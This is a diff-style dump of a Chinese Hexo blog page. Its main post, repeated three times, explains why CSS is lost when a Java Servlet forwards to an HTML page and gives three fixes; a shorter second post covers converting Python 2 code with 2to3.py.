+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/book/static/css/style.css&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p><strong>PS</strong>：如果修改之后请求的结果还每个发生变化，要么就是改错了，要么就是浏览器有缓存<a target="_blank" rel="noopener" href="https://www.cnblogs.com/junlin623/p/17030165.html">https://www.cnblogs.com/junlin623/p/17030165.html</a></p>
+<hr>
+<p>title: ‘Servlet转发到html页面样式丢失的问题-junlin623’<br>date: 2023-01-06 13:40:00</p>
+<hr>
+<meta name = "referrer" content = "no-referrer" />
+
+
+
+<p>在做书城项目的注册功能时需要实现: 在web层判断如果注册成功需要转发到注册成功页面regist_success.html</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//调用service将用户信息保存到数据库</span></span><br><span class="line">userService.registerUser(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="literal">null</span>, username, password, email));</span><br><span class="line"><span class="comment">//跳转到注册成功页面</span></span><br><span class="line">request.getRequestDispatcher(<span class="string">&quot;/pages/user/regist_success.html&quot;</span>).forward(request,response);</span><br></pre></td></tr></table></figure>
+
+
+<p>但是转发到regist_success.html页面之后该页面原来的样式也丢失了</p>
+<p>于是为了方面我使用get请求进行测试(浏览器地址栏中直接请求registerServlet：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    request.getRequestDispatcher(<span class="string">&quot;/pages/user/regist_success.html&quot;</span>).forward(request,response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>转发页面的结果如下：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230106124600366-97394301.png" width="40%" >
+
+
+<p>这肯定是css样式文件路径的问题：</p>
+<p>查看network中css文件的请求路径：</p>
+<p><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230106124844509-69159937.png"></p>
+<p>查看html代码中的请求路径：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;../../static/css/style.css&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>对比这三个路径可以发现html文件中的资源请求的相对路径是参照的浏览器地址栏中的地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/book/registerServlet</span><br></pre></td></tr></table></figure>
+
+<p>这里由于服务端Servlet使用的是转发，所以浏览器地址栏中的请求地址没有改变，这也就导致了资源请求路径错误（我们预想注册成功的这个html页面是相对于自己在服务端的路径的）</p>
+<p>项目路径：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230106131948246-1211506993.png" width="30%" >
+
+<h4 id="解决方法：-4"><a href="#解决方法：-4" class="headerlink" title="解决方法："></a>解决方法：</h4><ol>
+<li><p>在html的head标签中使用base标签，固定该页面中相对路径的参照路径</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;http://localhost/book/pages/user /&gt;</span></span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Servlet中使用重定向：这样浏览器中的地址会与重定向的地址相同</p>
+</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    response.sendRedirect(<span class="string">&quot;/book/pages/user/regist_success.html&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>资源路径改为绝对路径（注意：如果是浏览器解析的地址，&#x2F; 表示 <a href="http://ip:port，">http://ip:port，</a> 而在服务端 &#x2F; 表示 <a href="http://ip:port/工程名）">http://ip:port/工程名）</a></li>
+</ol>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/book/static/css/style.css&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p><strong>PS</strong>：如果修改之后请求的结果还每个发生变化，要么就是改错了，要么就是浏览器有缓存<a target="_blank" rel="noopener" href="https://www.cnblogs.com/junlin623/p/17030165.html">https://www.cnblogs.com/junlin623/p/17030165.html</a></p>
+<hr>
+<p>title: ‘Servlet转发到html页面样式丢失的问题-junlin623’<br>date: 2023-01-06 13:40:00</p>
+<hr>
+<meta name = "referrer" content = "no-referrer" />
+
+
+
+<p>在做书城项目的注册功能时需要实现: 在web层判断如果注册成功需要转发到注册成功页面regist_success.html</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//调用service将用户信息保存到数据库</span></span><br><span class="line">userService.registerUser(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="literal">null</span>, username, password, email));</span><br><span class="line"><span class="comment">//跳转到注册成功页面</span></span><br><span class="line">request.getRequestDispatcher(<span class="string">&quot;/pages/user/regist_success.html&quot;</span>).forward(request,response);</span><br></pre></td></tr></table></figure>
+
+
+<p>但是转发到regist_success.html页面之后该页面原来的样式也丢失了</p>
+<p>于是为了方面我使用get请求进行测试(浏览器地址栏中直接请求registerServlet：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    request.getRequestDispatcher(<span class="string">&quot;/pages/user/regist_success.html&quot;</span>).forward(request,response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>转发页面的结果如下：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230106124600366-97394301.png" width="40%" >
+
+
+<p>这肯定是css样式文件路径的问题：</p>
+<p>查看network中css文件的请求路径：</p>
+<p><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230106124844509-69159937.png"></p>
+<p>查看html代码中的请求路径：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;../../static/css/style.css&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>对比这三个路径可以发现html文件中的资源请求的相对路径是参照的浏览器地址栏中的地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/book/registerServlet</span><br></pre></td></tr></table></figure>
+
+<p>这里由于服务端Servlet使用的是转发，所以浏览器地址栏中的请求地址没有改变，这也就导致了资源请求路径错误（我们预想注册成功的这个html页面是相对于自己在服务端的路径的）</p>
+<p>项目路径：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230106131948246-1211506993.png" width="30%" >
+
+<h4 id="解决方法：-5"><a href="#解决方法：-5" class="headerlink" title="解决方法："></a>解决方法：</h4><ol>
+<li><p>在html的head标签中使用base标签，固定该页面中相对路径的参照路径</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;http://localhost/book/pages/user /&gt;</span></span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Servlet中使用重定向：这样浏览器中的地址会与重定向的地址相同</p>
+</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    response.sendRedirect(<span class="string">&quot;/book/pages/user/regist_success.html&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>资源路径改为绝对路径（注意：如果是浏览器解析的地址，&#x2F; 表示 <a href="http://ip:port，">http://ip:port，</a> 而在服务端 &#x2F; 表示 <a href="http://ip:port/工程名）">http://ip:port/工程名）</a></li>
+</ol>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/book/static/css/style.css&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p><strong>PS</strong>：如果修改之后请求的结果还每个发生变化，要么就是改错了，要么就是浏览器有缓存<a target="_blank" rel="noopener" href="https://www.cnblogs.com/junlin623/p/17030165.html">https://www.cnblogs.com/junlin623/p/17030165.html</a></p>
+<hr>
+<p>title: ‘Servlet转发到html页面样式丢失的问题-junlin623’<br>date: 2023-01-06 13:40:00</p>
+<hr>
+<meta name = "referrer" content = "no-referrer" />
+
+
+
+<p>在做书城项目的注册功能时需要实现: 在web层判断如果注册成功需要转发到注册成功页面regist_success.html</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//调用service将用户信息保存到数据库</span></span><br><span class="line">userService.registerUser(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="literal">null</span>, username, password, email));</span><br><span class="line"><span class="comment">//跳转到注册成功页面</span></span><br><span class="line">request.getRequestDispatcher(<span class="string">&quot;/pages/user/regist_success.html&quot;</span>).forward(request,response);</span><br></pre></td></tr></table></figure>
+
+
+<p>但是转发到regist_success.html页面之后该页面原来的样式也丢失了</p>
+<p>于是为了方面我使用get请求进行测试(浏览器地址栏中直接请求registerServlet：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    request.getRequestDispatcher(<span class="string">&quot;/pages/user/regist_success.html&quot;</span>).forward(request,response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>转发页面的结果如下：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230106124600366-97394301.png" width="40%" >
+
+
+<p>这肯定是css样式文件路径的问题：</p>
+<p>查看network中css文件的请求路径：</p>
+<p><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230106124844509-69159937.png"></p>
+<p>查看html代码中的请求路径：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;../../static/css/style.css&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>对比这三个路径可以发现html文件中的资源请求的相对路径是参照的浏览器地址栏中的地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/book/registerServlet</span><br></pre></td></tr></table></figure>
+
+<p>这里由于服务端Servlet使用的是转发，所以浏览器地址栏中的请求地址没有改变，这也就导致了资源请求路径错误（我们预想注册成功的这个html页面是相对于自己在服务端的路径的）</p>
+<p>项目路径：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230106131948246-1211506993.png" width="30%" >
+
+<h4 id="解决方法：-6"><a href="#解决方法：-6" class="headerlink" title="解决方法："></a>解决方法：</h4><ol>
+<li><p>在html的head标签中使用base标签，固定该页面中相对路径的参照路径</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;http://localhost/book/pages/user /&gt;</span></span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Servlet中使用重定向：这样浏览器中的地址会与重定向的地址相同</p>
+</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    response.sendRedirect(<span class="string">&quot;/book/pages/user/regist_success.html&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>资源路径改为绝对路径（注意：如果是浏览器解析的地址，&#x2F; 表示 <a href="http://ip:port，">http://ip:port，</a> 而在服务端 &#x2F; 表示 <a href="http://ip:port/工程名）">http://ip:port/工程名）</a></li>
+</ol>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/book/static/css/style.css&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p><strong>PS</strong>：如果修改之后请求的结果还每个发生变化，要么就是改错了，要么就是浏览器有缓存</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/05/18/Servlet%E8%BD%AC%E5%8F%91%E5%88%B0html%E9%A1%B5%E9%9D%A2%E6%A0%B7%E5%BC%8F%E4%B8%A2%E5%A4%B1%E7%9A%84%E9%97%AE%E9%A2%98-junlin623/" data-id="clhrwf8j1000xekszadc3dct9" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-python2代码转换成python3代码-junlin623" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/05/18/python2%E4%BB%A3%E7%A0%81%E8%BD%AC%E6%8D%A2%E6%88%90python3%E4%BB%A3%E7%A0%81-junlin623/" class="article-date">
+  <time class="dt-published" datetime="2023-05-17T16:09:35.136Z" itemprop="datePublished">2023-05-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/junlin623/p/17245302.html">https://www.cnblogs.com/junlin623/p/17245302.html</a></p>
+<hr>
+<p>title: ‘python2代码转换成python3代码-junlin623’<br>date: 2023-03-22 20:14:00</p>
+<hr>
+<meta name = "referrer" content = "no-referrer" />
+
+
+
+<p>安装了python3解析器后，它为我们提供了很多工具脚本，其中就包括pytho2转换成python3的脚本</p>
+<p>位置在 python的安装路径下的 <code>Tools\scripts</code> 文件夹下</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202303/2935791-20230322200707447-950599146.png" width="50%" >
+
+
+<p>将 <code>2to3.py</code> 拷贝到想要转换的文件所在的目录</p>
+<p>cmd中执行 <code>python 2to3.py --help</code></p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202303/2935791-20230322200842463-730555718.png" width="50%" >
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pytnon 2to3.py -w 待转换的文件名  <span class="comment"># -w 参数后跟转换的文件名</span></span><br></pre></td></tr></table></figure>
+
+<p>转换过程中会提示哪些地方发生了改变</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202303/2935791-20230322201202863-1050243091.png" width="50%" >
+
+
+
+<p>转换完成后会直接生成同名的python3文件，原来的python2文件会备份到 <code>.bak</code> 文件中</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202303/2935791-20230322201009530-1257740031.png" width="50%" >
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/05/18/python2%E4%BB%A3%E7%A0%81%E8%BD%AC%E6%8D%A2%E6%88%90python3%E4%BB%A3%E7%A0%81-junlin623/" data-id="clhrwf8jc001dekszaze9aw9m" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/page/3/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/5/">Next &raquo;</a>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/05/18/%E7%9B%B4%E8%BF%9E%E8%B7%AF%E7%94%B1%E8%A1%A8%E9%A1%B9%E8%A7%A3%E6%9E%90-junlin623/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/18/%E6%95%B4%E6%95%B0%E5%88%92%E5%88%86%E9%97%AE%E9%A2%98-junlin623/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/18/%E5%8E%9F%E7%94%9F%E6%96%B9%E5%BC%8F%E9%83%A8%E7%BD%B2JavaWeb%E9%A1%B9%E7%9B%AE%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%B8%BB%E6%9C%BA-junlin623/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/18/%E5%8E%9F%E6%9D%A5%E6%98%AFvmware-hostd%E7%A8%8B%E5%BA%8F%E5%8D%A0%E7%94%A8%E4%BA%86443%E7%AB%AF%E5%8F%A3-junlin623/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/18/%E5%AD%A6%E7%94%9F%E5%8F%AF%E4%BB%A5%E7%99%BD%E5%AB%96%E9%98%BF%E9%87%8C%E4%BA%91ECS%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8D%8A%E5%B9%B4~~-junlin623/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
